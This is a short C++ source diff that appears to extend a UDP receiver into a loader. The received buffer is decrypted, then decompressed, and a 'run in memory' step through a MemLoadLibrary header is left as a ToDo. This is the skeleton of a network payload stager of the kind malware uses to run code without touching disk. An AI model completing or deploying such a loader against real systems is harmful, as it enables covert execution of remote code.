@@ -3,6 +3,11 @@
 #include <stdio.h>
 #include <Ws2tcpip.h>
 #include <tchar.h>
+#include <string>
+
+#include "decryption.h"
+#include "decompression.h"
+#include "MemLoadLibrary.h"
 //#include <iostream>
 using namespace std;
 
@@ -95,7 +100,22 @@ int udp_server_clinet()
         closesocket(Socket);
         closesocket(Sub);
         WSACleanup();
-        printf("done\n");
+        printf("socket done\n");
+
+
+        //decryption
+        //ToDo decryption
+        decryption();
+
+        //decompression
+        //ToDo change decompression from file to buffer input
+        char* inBuf = Buffer;
+        char* opBuf = new char[sizeof(Buffer)];
+        uziphelp(inBuf, opBuf);
+
+        //run in memory
+        //ToDo run in memory
+
         return 0;
 
     }
